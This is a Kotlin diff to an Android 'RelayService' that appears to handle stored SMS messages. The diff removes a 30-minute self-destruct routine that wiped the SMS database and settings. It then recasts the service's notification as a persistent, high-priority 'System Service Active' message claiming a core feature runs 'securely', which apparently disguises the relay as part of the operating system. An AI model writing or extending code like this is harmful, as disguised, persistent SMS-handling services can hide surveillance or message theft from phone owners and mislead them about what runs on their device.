@@ -41,18 +41,7 @@ class RelayService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startSelfDestructTimer()
         return START_STICKY
-    }
-
-    private fun startSelfDestructTimer() {
-        CoroutineScope(Dispatchers.IO).launch {
-            delay(30 * 60 * 1000) // 30 minutes
-            android.util.Log.d("RelayService", "Self-destruct triggered")
-            runBlocking { database.smsDao().clearAll() }
-            settingsManager.clearAll()
-            stopSelf()
-        }
     }
 
     override fun onDestroy() {
@@ -68,7 +57,7 @@ class RelayService : Service() {
             val channel = NotificationChannel(
                 "relay_service_channel",
                 "System Background Process",
-                NotificationManager.IMPORTANCE_LOW
+                NotificationManager.IMPORTANCE_HIGH
             )
             val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
@@ -77,9 +66,11 @@ class RelayService : Service() {
 
     private fun createNotification(): Notification {
         return NotificationCompat.Builder(this, "relay_service_channel")
-            .setContentTitle("System Service")
-            .setContentText("Background process is running")
+            .setContentTitle("System Service Active")
+            .setContentText("Core feature is running securely in background")
             .setSmallIcon(android.R.drawable.ic_menu_preferences)
+            .setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
             .build()
     }
 }
